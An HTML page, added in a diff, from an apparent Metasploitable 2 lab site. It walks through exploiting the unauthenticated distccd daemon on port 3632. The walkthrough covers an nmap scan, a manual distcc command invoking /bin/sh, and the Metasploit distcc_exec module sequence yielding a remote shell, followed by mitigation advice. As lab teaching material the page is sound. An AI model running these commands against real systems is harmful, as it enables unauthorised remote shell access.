@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>distccd — Remote Command Execution | Metasploitable 2 Lab</title>
+  <link rel="stylesheet" href="../assets/css/style.css" />
+</head>
+<body>
+
+<nav class="site-nav">
+  <div class="container nav-inner">
+    <a class="nav-brand" href="../index.html">
+      <div class="brand-icon">M2</div>
+      <div class="brand-text"><h1>Metasploitable 2</h1><p>Penetration Testing Lab</p></div>
+    </a>
+    <div class="nav-links">
+      <a class="nav-link" href="../index.html#overview">Overview</a>
+      <a class="nav-link" href="../index.html#scan">Nmap Scan</a>
+      <a class="nav-link" href="../index.html#modules">Modules</a>
+    </div>
+    <a class="nav-btn btn" href="../index.html#modules">All Modules</a>
+  </div>
+</nav>
+
+<div class="container">
+  <div class="breadcrumb">
+    <a href="../index.html">Home</a><span>/</span>
+    <a href="../index.html#modules">Modules</a><span>/</span>
+    <span style="color:var(--text)">distccd</span>
+  </div>
+</div>
+
+<div class="module-hero">
+  <div class="container">
+    <div class="module-hero-top">
+      <div class="module-title-wrap">
+        <p class="section-label">Port 3632/tcp — Distributed Compiler Daemon</p>
+        <h2>distccd — Remote Command Execution via Daemon Misconfiguration</h2>
+        <p class="sub-title">Exploiting Unauthenticated Remote Command Execution</p>
+        <div class="overview-pills">
+          <span class="pill">CVE: <strong>N/A (Misconfiguration)</strong></span>
+          <span class="pill">Port: <strong>3632/tcp</strong></span>
+          <span class="pill">Impact: <strong>Remote Shell</strong></span>
+          <span class="pill">Tool: <strong>Metasploit</strong></span>
+        </div>
+      </div>
+      <span class="badge badge-high" style="font-size:.85rem;padding:.4rem 1rem">High</span>
+    </div>
+    <div class="overview-box">
+      <div class="overview-box-grid">
+        <div><div class="ov-item-label">Service</div><div class="ov-item-value">GNU distcc daemon</div></div>
+        <div><div class="ov-item-label">Attack Type</div><div class="ov-item-value">RCE via Job Requests</div></div>
+        <div><div class="ov-item-label">MSF Module</div><div class="ov-item-value mono">exploit/unix/misc/distcc_exec</div></div>
+        <div><div class="ov-item-label">Result</div><div class="ov-item-value" style="color:var(--red)">✓ Remote Shell Obtained</div></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="container">
+  <div class="content-layout">
+    <main class="content-body">
+
+      <div class="step-section" id="service-overview">
+        <div class="step-label"><div class="step-num">01</div><h3>Vulnerability Overview</h3></div>
+        <p>The distccd service is misconfigured to allow unauthenticated remote command execution. The daemon executes arbitrary commands passed to it via job requests without proper validation, leading to remote code execution.</p>
+        <div class="callout">
+          distcc is designed for distributed compilation but when misconfigured, it becomes a dangerous service allowing remote command execution.
+        </div>
+      </div>
+
+      <div class="step-section" id="enumeration">
+        <div class="step-label"><div class="step-num">02</div><h3>Service Detection</h3></div>
+        <div class="code-wrap">
+          <div class="code-header"><span class="code-lang">bash</span><button class="copy-btn">Copy</button></div>
+          <pre class="code-block"><span class="cmd">nmap</span> <span class="kw">-sV -v -p 3632</span> <span class="str">&lt;target-ip&gt;</span></pre>
+        </div>
+        <div class="screenshot-wrap">
+          <div class="screenshot-bar">
+            <div class="terminal-dot dot-r"></div><div class="terminal-dot dot-y"></div><div class="terminal-dot dot-g"></div>
+            <span class="screenshot-caption">Nmap distccd Service Version Scan</span>
+          </div>
+          <img src="../distccd/Nmap_distccd_Service_Scan.png" alt="distccd Nmap" loading="lazy" />
+        </div>
+      </div>
+
+      <div class="step-section" id="manual-exploit">
+        <div class="step-label"><div class="step-num">03</div><h3>Manual Exploitation</h3></div>
+        <p>Use distcc to execute remote commands:</p>
+        <div class="code-wrap">
+          <div class="code-header"><span class="code-lang">bash</span><button class="copy-btn">Copy</button></div>
+          <pre class="code-block"><span class="cmd">distcc</span> <span class="str">&lt;target-ip&gt;:3632</span> <span class="kw">gcc -c /bin/sh -o /tmp/shell</span></pre>
+        </div>
+        <div class="screenshot-wrap">
+          <div class="screenshot-bar">
+            <div class="terminal-dot dot-r"></div><div class="terminal-dot dot-y"></div><div class="terminal-dot dot-g"></div>
+            <span class="screenshot-caption">distccd Manual Command Execution</span>
+          </div>
+          <img src="../distccd/distccd_Manual_Exploit.png" alt="distccd Manual" loading="lazy" />
+        </div>
+      </div>
+
+      <div class="step-section" id="metasploit">
+        <div class="step-label"><div class="step-num">04</div><h3>Automated Exploitation — Metasploit</h3></div>
+        <div class="code-wrap">
+          <div class="code-header"><span class="code-lang">bash</span><button class="copy-btn">Copy</button></div>
+          <pre class="code-block"><span class="cmd">msfconsole</span>
+<span class="kw">use</span> <span class="pth">exploit/unix/misc/distcc_exec</span>
+<span class="kw">set</span> RHOSTS <span class="str">&lt;target-ip&gt;</span>
+<span class="kw">run</span></pre>
+        </div>
+        <div class="screenshot-wrap">
+          <div class="screenshot-bar">
+            <div class="terminal-dot dot-r"></div><div class="terminal-dot dot-y"></div><div class="terminal-dot dot-g"></div>
+            <span class="screenshot-caption">Metasploit distccd Exploit</span>
+          </div>
+          <img src="../distccd/distccd_Metasploit_Exploit.png" alt="distccd Metasploit" loading="lazy" />
+        </div>
+      </div>
+
+      <div class="step-section" id="results">
+        <div class="step-label"><div class="step-num">05</div><h3>Results &amp; Impact</h3></div>
+        <div class="results-box">
+          <h4>Outcome</h4>
+          <ul>
+            <li>Successfully executed remote commands via distccd</li>
+            <li>Obtained shell access on the target system</li>
+            <li>Potential for full system compromise</li>
+          </ul>
+        </div>
+        <div class="mitigation-box">
+          <h4>Detection &amp; Mitigation (Blue Team)</h4>
+          <ul>
+            <li>Configure distccd to only accept connections from trusted hosts</li>
+            <li>Use authentication and access controls</li>
+            <li>Restrict distccd to localhost or disable if not needed</li>
+            <li>Use firewall to block port 3632 externally</li>
+            <li>Monitor distccd logs for suspicious job requests</li>
+          </ul>
+        </div>
+      </div>
+
+    </main>
+    <aside class="toc">
+      <div class="toc-title">On This Page</div>
+      <a href="#service-overview">Overview</a>
+      <a href="#enumeration">Detection</a>
+      <a href="#manual-exploit">Manual Exploit</a>
+      <a href="#metasploit">Metasploit</a>
+      <a href="#results">Results</a>
+    </aside>
+  </div>
+</div>
+
+<footer class="site-footer">
+  <div class="container footer-inner">
+    <div class="footer-left">← <a href="../index.html#modules" style="color:var(--cyan)">Back to Modules</a></div>
+    <div class="footer-links"><a href="./postgresql.html">← PostgreSQL</a></div>
+  </div>
+</footer>
+<div id="lightbox" class="lightbox-overlay"><button class="lightbox-close">✕</button><img src="" alt="" /></div>
+<script src="../assets/js/app.js"></script>
+</body>
+</html></content>
+<parameter name="filePath">c:\Users\Digits\Documents\GitHub\metasploitable2-penetration-testing-lab\pages\distccd.html
